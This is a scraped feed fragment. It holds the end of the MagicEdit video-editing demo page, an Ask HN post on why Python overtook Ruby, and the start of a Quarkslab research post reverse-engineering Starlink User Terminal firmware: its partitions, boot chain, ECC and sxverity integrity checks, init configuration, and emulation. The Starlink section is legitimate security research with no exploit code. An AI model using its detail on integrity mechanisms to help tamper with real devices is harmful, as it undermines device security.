        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_5_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_5_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_6_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_6_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_7_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_7_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"a senior lady"</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>"a young lady"</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>"a pretty girl"</td>
        </tr>
      </tbody></table>
    </center>

  </div>
  <hr>
  <div>
    <h2>Video-MagicMix</h2>
      <p>
        Similar to <a href="https://magicmix.github.io/">MagicMix</a>, we can also mix two different concepts (e.g., rabbit and tiger) in the video domain to create a novel concept (e.g., a rabbit-alike tiger).
      </p>
    <hr>
    <table>
      <tbody><tr>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/magicmix/sample_1_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/magicmix/sample_1_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/magicmix/sample_2_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"+ tiger"</td>
          <td></td>
          <td>"+ piglet"</td>
        </tr>
      </tbody></table>
    </center>
    <table>
      <tbody><tr>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/magicmix/sample_3_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/magicmix/sample_3_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/magicmix/sample_4_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"+ tiger"</td>
          <td></td>
          <td>"+ cat"</td>
        </tr>
      </tbody></table>
    </center>
  </div>

  <hr>
  <div>
    <h2>Video Outpainting</h2>
      <p>
        MagicEdit also supports video outpainting task without any re-training.
      </p>
    <hr>
    
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>Outpainted</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>Outpainted</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>Outpainted</td>
        </tr>
      </tbody></table>
    </center>
    <table>
      <tbody><tr>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_2_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_2_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_5_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_5_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_6_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_6_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>"a handsome man, jogging, on the road, sunny"</td>
          <td></td>
          <td>"a cute dog, garden, flowers"</td>
          <td></td>
          <td>"a pretty girl, sunset"</td>
        </tr>
      </tbody></table>
    </center>

    <table>
      <tbody><tr>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_7_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_7_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_9_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_9_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_10_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_10_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>"a pretty girl, grey t-shirt"</td>
          <td></td>
          <td>"an eagle, sea"</td>
          <td></td>
          <td>"a brown bear, forest"</td>
        </tr>
      </tbody></table>
    </center>

    <hr>
    <center>
      <h2><b></b> Video outpainting with different ratios and prompts</h2>
      <!-- <p>
        xxx
      </p> -->
    </center>
    <hr>

    <table>
      <tbody><tr>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_8_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_8_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_4_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_4_edit.mp4"></video></td>
      </tr>
    </tbody></table>


    <table>
      <tbody><tr>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_1_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_1_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_2_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_2_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_3_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_3_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td><b>Prompt</b> = "a handsome man, jogging, on the road, trees, sunny"</td>
          <td></td>
          <td><b>Prompt</b> + "long pants"</td>
        </tr>
      </tbody></table>
    </center>
  </div>


</div>

<div id="BibTeX">
    <h2>BibTeX</h2>
    <pre><code>@inproceedings{liew2023magicedit,
    author = {Liew, Jun Hao and Yan, Hanshu and Zhang, Jianfeng and Xu, Zhongcong and Feng, Jiashi},
    title = {MagicEdit: High-Fidelity and Temporally Coherent Video Editing},
    booktitle={arXiv},
    year = {2023}
}</code></pre>
  </div>


<!-- <footer class="footer">
  <div class="container">
    <div class="content has-text-centered">
      <a class="icon-link" href="">
        <i class="fas fa-file-pdf"></i>
      </a>
      <a class="icon-link" href="" class="external-link" disabled>
        <i class="fab fa-github"></i>
      </a>
    </div>
    <div class="columns is-centered">
      <div class="column is-6">
        <div class="content">
          <p>
             The source code of this webpage is based on the <a href="https://github.com/nerfies/nerfies.github.io/"> Nerfies</a> project webpage.
          </p>
        </div>
      </div>
    </div>
  </div>
</footer> -->





</div>]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Ask HN: Why did Python win? (417 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=37308747</link>
            <guid>37308747</guid>
            <pubDate>Tue, 29 Aug 2023 14:48:20 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=37308747">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><td><table>
        <tbody><tr id="37308747">
      <td><span></span></td>      <td><center><a id="up_37308747" href="https://news.ycombinator.com/vote?id=37308747&amp;how=up&amp;goto=item%3Fid%3D37308747"></a></center></td><td><span><a href="https://news.ycombinator.com/item?id=37308747">Ask HN: Why did Python win?</a></span></td></tr><tr><td colspan="2"></td><td><span>
          <span id="score_37308747">138 points</span> by <a href="https://news.ycombinator.com/user?id=MatthiasPortzel">MatthiasPortzel</a> <span title="2023-08-29T14:48:20"><a href="https://news.ycombinator.com/item?id=37308747">7 hours ago</a></span> <span id="unv_37308747"></span> | <a href="https://news.ycombinator.com/hide?id=37308747&amp;goto=item%3Fid%3D37308747">hide</a> | <a href="https://hn.algolia.com/?query=Ask%20HN%3A%20Why%20did%20Python%20win%3F&amp;type=story&amp;dateRange=all&amp;sort=byDate&amp;storyText=false&amp;prefix&amp;page=0">past</a> | <a href="https://news.ycombinator.com/fave?id=37308747&amp;auth=3b729daf9e037e91bacc1b8d62e74da7bbc9e16c">favorite</a> | <a href="https://news.ycombinator.com/item?id=37308747">276&nbsp;comments</a>        </span>
              </td></tr>
    <tr></tr><tr><td colspan="2"></td><td><div><p>I started programming in ~2013 in JavaScript. I’ve since learned and tried a handful of languages, including Python, but JavaScript was always my favorite. Just within the last year I learned Ruby, and I was blown away by how fun and easy to use it is. At the present time, I’m starting all my new projects in Ruby.</p><p>My impression is that in the ‘00s, Python and Ruby were both relatively new, dynamically typed, “English-like” languages. And for a while these languages had similar popularity.</p><p>Now Ruby is still very much alive; there are plenty of Rails jobs available and exciting things happening with Ruby itself. But Python has become a titan in the last ten years. It has continued to grow exponentially and Ruby has not.</p><p>I can guess as to why (Python’s math libraries, numpy and pandas make it appealing to academics; Python is simpler and possibly easier to learn; Rails was so popular that it was synonymous with Ruby) but I wasn’t paying attention at that time. So I’m interested in hearing from some of the older programmers about why Ruby has stalled out and Python has become possibly the most popular programming language (when, in my opinion, Ruby is the better language).</p></div></td></tr>        <tr></tr><tr><td colspan="2"></td><td><form action="comment" method="post"></form></td></tr>  </tbody></table>
</td></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Starlink's User Terminal Firmware (190 pts)]]></title>
            <link>https://blog.quarkslab.com/starlink.html</link>
            <guid>37308405</guid>
            <pubDate>Tue, 29 Aug 2023 14:24:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.quarkslab.com/starlink.html">https://blog.quarkslab.com/starlink.html</a>, See on <a href="https://news.ycombinator.com/item?id=37308405">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
  

  <p>This blog post presents an overview of Starlink's User Terminal runtime internals, focusing on the communications that happen within the device and with user applications and some tools that can help further research on the same topic.</p>

  

<h2>Introduction</h2>
<p>Starlink is a satellite-based Internet access service provided by Space X. This service already counts more than <a href="https://twitter.com/Starlink/status/1654673695007457280">1.5 million subscribers</a> all around the world, using the very same infrastructure. Starlink relies on 3 components:</p>
<ul>
<li>A user terminal, which communicates with the satellites, and on which most of the current research is focused.</li>
<li>A satellite fleet acting as a mesh network.</li>
<li>A gateway that connects the satellites to the internet.</li>
</ul>
<p>Numerous studies [<a href="https://radionavlab.ae.utexas.edu/wp-content/uploads/2023/01/starlink_structure.pdf">1</a>, <a href="https://www.esat.kuleuven.be/cosic/blog/dumping-and-extracting-the-spacex-starlink-user-terminal-firmware/">2</a>, <a href="https://github.com/KULeuven-COSIC/Starlink-FI">3</a>] have already been conducted on the subject, mainly on the user terminal.
During my 6-month internship at <a href="https://www.quarkslab.com/">Quarkslab</a> as part of my Master's degree program at the <a href="https://www.unitn.it/en">University of Trento</a>, I carried out the analysis of Starlink by reverse-engineering its firmware and the various protocols it uses.
At the end of the internship, I gained a good knowledge of how the device works internally and developed a set of tools that could help other researchers working on the same topic.
These tools will be described and published along with this blog post.</p>
<p>To conduct this study, we analyzed two regular User Terminals version 2 (the round one) and a User Terminal version 3 (the squared one) with root access (researcher access) which was provided by SpaceX's security team toward the end of my internship.</p>
<h2>Firmware overview</h2>
<p>The first step was to dump the firmware of the device since it's not publicly available, and we did that thanks to a <a href="https://www.esat.kuleuven.be/cosic/blog/dumping-and-extracting-the-spacex-starlink-user-terminal-firmware/">blog post</a> by the <a href="https://www.esat.kuleuven.be/cosic/">COSIC</a> research group at KU Leuven.
Once we got the firmware, we started inspecting the content, trying to understand how the memory was structured.
We also started looking into the U-Boot version that was customized by SpaceX, and it is being used as the final bootloader stage (BL33) for the User Terminal.
The U-Boot license requires any modification of its code to be published with the same license, hence you can find it on <a href="https://github.com/SpaceExplorationTechnologies/u-boot">GitHub</a>.</p>
<p>From the file <a href="https://github.com/SpaceExplorationTechnologies/u-boot/blob/sx_2022_05_03/include/configs/spacex_catson_boot.h"><code>include/configs/spacex_catson_boot.h</code></a> we can see how the memory is partitioned, here is a part of it:</p>
<div><pre><span></span><code><span>+-----------------+</span><span> 0x0000_0000</span>
<span>| bootfip0 (1 MB) |</span>
<span>+-----------------+</span><span> 0x0010_0000</span>
<span>[</span><span>...</span><span>]</span><span></span>
<span>+-----------------+</span><span> 0x0060_0000</span>
<span>| fip  a</span><span>.</span><span>0 (1 MB) |</span>
<span>+-----------------+</span><span> 0x0070_0000</span>
<span>[</span><span>...</span><span>]</span><span></span>
<span>+-----------------+</span><span> 0x0100_0000</span>
<span>| linux a (32 MB) |</span>
<span>+-----------------+</span><span> 0x0300_0000</span>
<span>| linux b (32 MB) |</span>
<span>+-----------------+</span><span> 0x0500_0000</span>
<span>[</span><span>...</span><span>]</span><span></span>
</code></pre></div>

<p>This allows us to split the image into small partitions and analyze each of them separately.
<a href="https://github.com/quarkslab/starlink-tools/tree/main/parts-extractor">This script</a> can help you do that automatically.
From here, we can also see that almost every partition is present multiple times (e.g. <code>linux a/b</code>).
This is because of the software update procedure, which will overwrite the partition that is not currently being used so that in the case of an error, there will still be the original partition that is known to be "correct".
An overview of the main partitions can be seen in the following picture.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/partitions.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/partitions.png" width="80%">
    </a>
</center>
<p>Partitions <code>Boot FIP</code> and <code>FIP</code> contain all the bootloader stages that compose the secure boot chain, most of them are based on the <a href="https://www.trustedfirmware.org/projects/tf-a/">ARM TF-A project</a>, which does not come with a GNU-like license, and the last one (BL33) is the U-Boot bootloader we mentioned above.</p>
<p>Having a clear idea of the boot process is essential to perform the <a href="https://github.com/KULeuven-COSIC/Starlink-FI">fault injection attack</a> developed by the COSIC research group.
The boot chain follows the classic multi-stage secure boot implemented by ARM TF-A, in the following picture you can see an overview of it.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/boot-chain.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/boot-chain.png" width="100%">
    </a>
</center>
<p>Boot stages come from different partitions of the eMMC and the first, which represents the Root of Trust, comes from an internal ROM of the main processor, they can be extracted from the partition images by using <a href="https://github.com/ARM-software/arm-trusted-firmware/tree/master/tools/fiptool">fiptool</a>, from ARM TF-A.
At the end of the boot process, BL31 will reside in Exception Level 3 (EL3) and act as a secure monitor, while the Linux kernel will run in Exception Level 1 (EL1), in the normal world running user-land applications in Exception Level 0 (EL0).</p>
<p>Then, the <code>linux</code> partition, as the name suggests, contains the Linux kernel, its ramdisk image and some Flattened Device Trees, one for every hardware version of the User Terminal.
This partition can be unpacked by using <a href="https://github.com/u-boot/u-boot/blob/master/tools/dumpimage.c">dumpimage</a> from the U-Boot project, the ramdisk is a <code>cpio</code> image and FDTs come in the form of Device Tree Blobs (DTBs) which can be "decompiled" to Device Tree Sources (DTSs) text with the <a href="https://elinux.org/Device_Tree_Reference">Device Tree Compiler</a>.
This partition also comes with some Error Correcting Code (ECC) information in it, you will need to remove it before being able to unpack it.
The ECC mechanism is custom-made by SpaceX and you can understand how it works by looking at the code in U-Boot which handles this verification, the next <a href="#integrity">Section</a> explains how it works and provides a tool to do that.</p>
<p>The <code>sx</code> (SX Runtime) partition contains configuration files and binaries that are specific to the User Terminal.
This partition will be mounted by the Linux's init script on <code>/sx/local/runtime</code> and after that binaries in this volume will be started.
In this case, integrity verification is done with <code>sxverity</code> which is yet another custom tool by SpaceX.
The next section will explain how this works.</p>
<p>Other partitions include some encrypted ones, using the Linux Unified Key System (LUKS), which are the only ones with the write permission, and some other smaller partitions that are not worth mentioning.</p>
<h2><a name="integrity"></a>Data integrity</h2>
<p>As we have seen from a brief analysis of the content of the eMMC dump, SpaceX is using some custom-made mechanisms for data integrity, along with the standard ones already included in ARM TF-A and U-Boot. Here is an overview of the custom-made components.</p>
<h3>ECC</h3>
<p>The Error Correcting code mechanism is only used in the FIT image and only provides data integrity, without considering authenticity. This means that, in theory, you can tamper with some ECC-protected components of the dish if you provide correctly formatted data using your own implementation of the <code>ecc</code> procedure (or using the binary found in the ramdisk). But for the FIT image, this is not possible because authenticity is also checked by the last bootloader stage.
So this is just used to prevent errors in the eMMC storage.</p>
<p>This works similarly to its original ancestor, the ECC RAM, which embeds some additional data in between the actual content of the memory - originally Hamming codes - that are computed as a function of the data they are "protecting".
Then, when some data is accessed, Hamming codes are recomputed and if they do not correspond to the ones saved in memory, an error occurred, and depending on how many bits have been mistakenly flipped, the error can be corrected.
This version of ECC uses Reed-Solomon error correction (instead of Hamming codes) and a final hash (i.e. MD5) to check the integrity of the whole file that is being decoded.</p>
<p><a href="https://github.com/quarkslab/starlink-tools/tree/main/unecc">Here</a> you can find a simple Python script that strips out ECC information from a file, without checking the correctness of the data, that we used to be able to unpack the FIT image. Inside the ramdisk, there is a binary (<code>unecc</code>) that does the same thing also checking and trying to correct possible errors.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/ecc.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/ecc.png" width="100%">
    </a>
</center>
<p>The content of ECC-protected files is organized into blocks of different types, the above figure shows how each block is structured.
The file starts with a header block (a), which contains the magic number and the version of the protocol, along with some data and the corresponding control codes.
Then, there can be zero or more data blocks (b) containing just data and control codes.
A last data block (c), which is recognized by its block type field (<code>$</code>, instead of <code>*</code>), marks the end of the payload, some padding is added here if needed.
Finally, the footer block (d) contains the size of the payload (needed to know the number of padding bytes), an MD5 checksum of the whole payload and, of course, ECC code words for the footer block itself.</p>
<h3>sxverity</h3>
<p><code>sxverity</code> is a custom wrapper for the device-mapper-verity (dm-verity) kernel feature, which provides transparent integrity checking of block devices.
The source code of the tool is not publicly available, thus we had to reverse the compiled binary to understand the internals.
This provides both data integrity and authenticity thanks to a signature check that verifies the whole content of the device.
<code>sxverity</code> internally uses the dm-verity kernel feature, by directly interacting with it through the <code>/dev/mapper/control</code> device.</p>
<p>SpaceX only tackled the verification of the root hash, everything underneath, which is handled by the kernel, has not been reimplemented, a nice explanation of how this works can be found <a href="https://source.android.com/docs/security/features/verifiedboot/dm-verity">here</a>.</p>
<p>As we have seen in previous sections, <code>sxverity</code> is used to verify some of the partitions that reside in the persistent memory, this is to prevent persistent exploits.
But as we'll see in the next sections, it is also used to verify software updates for the dish. Thus, it is a critical component for the overall security of the device.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/sxverity-header.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/sxverity-header.png" width="40%">
    </a>
</center>
<p>In the picture above you can see the structure of a <code>sxverity</code> image.
It is composed of a header, that is repeated 4 times, possibly signed with different public keys, which contains:</p>
<ul>
<li>The magic bytes <code>"sxverity"</code>.</li>
<li>The version and some flags indicating which algorithms have been used for signing and hashing.</li>
<li>The root hash, which indirectly covers the whole payload (through the hash tree).</li>
<li>The public key that has been used to sign the image.</li>
<li>The signature of all the fields above, using an elliptic curve (ED25519).</li>
</ul>
<p>The parsing and verification procedure performed by this process will be described in the <a href="#fuzzing">Fuzzing</a> section.</p>
<h2>Runtime overview</h2>
<p>In this section, we will discuss what happens after the bootloader chain, starting from the Linux's init script to the processes that handle the runtime of the User Terminal.</p>
<p>The <code>init</code> script is the first process started by the kernel and usually has a process identifier (PID) equal to 1.
Its main task is to start all the other runtime processes needed for the system to be useful, and remains running until the system is shut down. It will be the "oldest" ancestor of any other process and it is also used by the user to start, stop and configure daemons once the system is up and running.
The most common init script you can find in an end-user Linux distribution is <code>systemd</code>, which is a collection of tools to manage the whole runtime of the system (e.g. <code>systemctl</code>), among which there is also the <code>init</code> script.</p>
<p>SpaceX's people like to implement their own software, so they implemented their own init script, which can be found in the ramdisk, at <code>/usr/sbin/sxruntime_start</code>. This uses a custom formatted configuration file that contains the instructions of which processes to start, how to start them and in which order.</p>
<div><pre><span></span><code><span>#######################################</span>
<span># user terminal frontend</span>
<span>#</span>
<span># Wait until dish config partition is set up before launching.</span>
<span>#######################################</span>
proc            user_terminal_frontend
apparmor        user_terminal_frontend
start_if        <span>$(</span>cat /proc/device-tree/model<span>)</span> !<span>=</span> <span>'spacex_satellite_starlink_transceiver'</span>
startup_flags   wait_on_barrier
user            sx_packet
custom_param    --log_wrapped
</code></pre></div>

<p>The snippet above shows how a process called <code>user_terminal_frontend</code> is started:</p>
<ul>
<li>It is started only if the condition <code>$(cat /proc/device-tree/model) != 'spacex_satellite_starlink_transceiver'</code> is satisfied.</li>
<li>It is started after the last process marked with the <code>barrier</code> flag has exited.</li>
<li>It is executed as the Linux user <code>sx_packet</code>.</li>
<li>The command line parameter <code>--log_wrapped</code> is passed to it.</li>
</ul>
<p>The two configuration files that are parsed by the init script can be found at <code>/etc/runtime_init</code> (ramdisk) and <code>/sx/local/runtime/dat/common/runtime</code> (runtime image).
The first one handles system-level services and configurations, such as mounting partitions (e.g. the runtime), and setting up the network, the console and the logger service.
The second one, instead, handles more high-level processes and configurations, such as starting all the processes contained in the runtime image and initializing encrypted devices.</p>
<p>Additionally, the init script also assigns priorities and specific CPU cores to those processes, by following some rules listed in another configuration file, that can be found at <code>/sx/local/runtime/dat/common/runtime_priorities</code>.</p>
<h3>File system &amp; mount points</h3>
<p>First of all, the root filesystem is copied in RAM by the last bootloader (U-Boot, BL33), and is mounted at <code>/</code>.
Partitions of the eMMC can be accessed by the system through the files <code>/dev/blk/mmcblk0pN</code> where <code>mmcblk0</code> is the name of the eMMC and <code>N</code> is the partition index, starting from 1.
For convenience, a script will then create some symbolic links to these partitions to use a more explicit name, as shown below.</p>
<div><pre><span></span><code><span># [...]</span>
ln -s /dev/mmcblk0p1 /dev/blk/bootfip0
ln -s /dev/mmcblk0p2 /dev/blk/bootfip1
ln -s /dev/mmcblk0p3 /dev/blk/bootfip2
ln -s /dev/mmcblk0p4 /dev/blk/bootfip3
<span># [...]</span>
</code></pre></div>

<p>Since almost every partition is duplicated, another script will then create additional links in the folders <code>/dev/blk/current</code> and <code>/dev/blk/other</code>, the first one containing the partitions that are currently being used by the system and second one containing the other ones, that will be used in case of a software update.
The system knows which partitions have been used for the current boot by looking in <code>/proc/device-tree/chosen/linux_boot_slot</code> which is populated by the bootloader.</p>
<p>Then, the <code>runtime</code> partition is unpacked using <code>sxverity</code> and the content is extracted to <code>/sx/local/runtime</code>.
This partition contains two folders:</p>
<ul>
<li><code>bin</code> contains binaries and executable scripts.</li>
<li><code>dat</code> contains a lot of additional data like AppArmor rules, hardware-specific configurations and generic configuration files, such as <code>dat/common/runtime</code> which is the (second) configuration file used by the init script.</li>
</ul>
<p>After these operations, the root filesystem is remounted with the <code>ro</code> (read-only) flag.
Additional partitions are then mounted, such as:</p>
<ul>
<li><code>/dev/blk/current/version_info</code> on <code>/mnt/version_info</code> (through <code>sxverity</code>).</li>
<li><code>/dev/blk/dish_cfg</code> on <code>/mnt/dish_cfg</code> (through <code>LUKS</code>).</li>
<li><code>/dev/blk/edr</code> on <code>/mnt/edr</code> (through <code>LUKS</code>).</li>
</ul>
<h3>Daemons</h3>
<p>After the elaborate boot procedure and system configuration we finally reach a state in which some processes are running, each one with a unique task, to provide the user with the service the device is built for, i.e. a satellite internet connection.
As you may have guessed, many things happen in the background to ensure a stable enough internet connection such as sending and receiving traffic to and from satellites, choosing which satellite to connect to, changing satellite (without disrupting the Internet connection) when the current one moved too far, handling user requests coming from the mobile application, etc.
Furthermore, these processes need to communicate continuously with each other to synchronize and cooperate, and with Starlink's cloud services for backend functionalities.</p>
<p>Most of the binaries have been implemented in C++ and some of them are also statically linked.
Due to this, it was challenging to reverse-engineer these binaries and due to time constraints, we were unable to fully comprehend all of them.
Some work was done to identify statically linked library functions, using the binary diffing technique.
It is also probable that these programs were implemented using the <a href="https://www.scribd.com/document/68990784/B31-full">State Machine Design Pattern</a>, which makes heavy use of features of Object Oriented Programming such as multiple inheritance, virtual methods and generic types.
This made the reverse-engineering process even more difficult due to the complex structures that are produced by the compiler when using these features.</p>
<p>We tried to compare the network stack of the User Terminal with the known ISO-OSI stack, and the following could be a proper mapping:</p>
<ul>
<li><code>phyfw</code> (Physical Firmware, perhaps) handles the physical layer of the satellite communication, which includes modulation/demodulation of RF signals.</li>
<li><code>rx_lmac</code> and <code>tx_lmac</code> (rx/tx lower Medium Access Control, perhaps) fall in the data link layer, and handle the physical access to the medium, separately for receiving and transmitting.</li>
<li><code>umac</code> (upper Medium Access Control, perhaps), could represent the network layer. It handles the access to the medium, at a higher level, and coordinates between the transmission and reception of frames. It may also be in charge of choosing which satellite to connect to.</li>
<li><code>connection_manager</code> could represent the transport layer and, if it's the case, it handles stateful connections between the dish and satellites, in which the traffic will be exchanged.</li>
<li><code>ut_packet_pipeline</code> is probably used to create an encrypted tunnel in which user traffic will be exchanged using the secure element on the dish for handshakes. This could be associated with the known protocols such as TLS, DTLS, IPsec or, again, a custom one.</li>
</ul>
<p>Other than these network-related processes there also are some processes that handle system telemetry, software updates, system health status and outage detection/reporting and finally a "control" process that acts as an orchestrator for all the other processes.</p>
<p>On the other hand, one of the binaries, namely <code>user_terminal_frontend</code>, is implemented in Go, an open-source (compiled) programming language from Google.
Go binaries are statically linked and they include the go runtime, so they are pretty big, but luckily they also include symbols that are used by the runtime for comprehensive runtime error reporting, which includes function names, source code line numbers and data structures.
All this precious information can be recovered using a plugin for Ghidra called <a href="https://github.com/mooncat-greenpy/Ghidra_GolangAnalyzerExtension">GolangAnalyzer</a> which was quite effective.
The extension also recovers complex data types and creates the corresponding C-like structures in Ghidra, which is extremely useful when working with an OOP language.
Additional manual analysis is needed because of the custom calling convention used by Go, but after this, the resulting disassembled C code is easily readable.
Our primary focus was on the runtime's higher-level components, which include this process.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/architecture.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/architecture.png" width="100%">
    </a>
</center>
<p>To summarize this section, in the picture above you can see a sketch of the architecture of the runtime (not complete), in which you can see that processes at the bottom, "closer" to the hardware, are statically linked, probably for performance reasons, and communicate only with the control process, while the other ones also communicate with Starlink's cloud services, through gRPC.
In section <a href="#communications">Communications</a>, we will tackle all the communications shown by this picture in more detail.
And finally, there is the go binary (which is technically statically linked as well, but just because of the language constraint), which communicates with frontend applications used by the user.</p>
<h2>Runtime emulation</h2>
<p>Due to the negative results of our Fault injection attack, we didn't have access to a live device on which to check our findings or perform some dynamic analysis.
Thus, we tried to set up an emulated environment, as similar as possible to the real device, that would be capable of executing runtime binaries.
We are emulating the entire system (full-system emulation), starting from the kernel, using QEMU as an emulator engine.
In the following paragraphs we describe every challenge we had to deal with, including the ones we couldn't solve, while setting up the environment and the final result.</p>
<p>The first choice to be made is which hardware we want QEMU to emulate.
When you want to emulate an IoT device using QEMU you usually look for the hardware implementation of the particular device for QEMU, which is usually available for common, off-the-shelf devices such as Arduino, Raspberry Pi, and less-known boards as well.
The hardware implementation of our device was, of course, not available, so we used the <code>(aarch64) virt</code> machine, which is the most generic one.
The proper way to emulate the whole device would have been to construct this machine specification for QEMU, as well as implement emulators for every piece of hardware that is present on the board.
The problem is that most of the peripherals present on the device are not open hardware, and even if they were, implementing all of them in QEMU would have been a lot of work.
Instead, using the <code>virt</code> machine and tweaking the Device Tree is much easier, at the cost of not having most of the hardware peripherals and thus some limitations.</p>
<p>Another problem was the choice of the kernel to run in QEMU.
We tried with the original one, extracted from the FIT of the firmware, but that didn't work in the emulated environment. So we decided to compile one ourselves.
Unfortunately, the open-source version of Linux published by SpaceX is 5.10.90, while the one found on the dish was 5.15.55, so we used the mainstream Linux kernel.
A lot of tweaks in the compile-time configuration had to be made for it to boot, some of them required by QEMU and some of them required by Starlink's software.
It is possible to extract this configuration from a compiled Kernel image, using the script <code>extract-ikconfig</code> from the Linux kernel repository, which was used to find differences between the default one and the one configured by SpaceX.</p>
<p>The device tree not only contains information about hardware peripherals but also data that is used by the runtime, such as public keys used by <code>sxverity</code>.
Additionally, the U-Boot bootloader also populates the FDT before booting the Linux kernel, by adding, for example, which set of partitions have been used in the current boot, the name of the main network interface and more.
All this information is of course not included in the FDT set by QEMU for the <code>virt</code> machine, thus we extracted this FDT, using the <code>dumpdtb</code> flag, and added the missing information, as shown below, which can then be recompiled using the Device Tree compiler (<code>dtc</code>) and given to QEMU using the <code>-dtb</code> flag.</p>
<div><pre><span></span><code><span># ...</span>
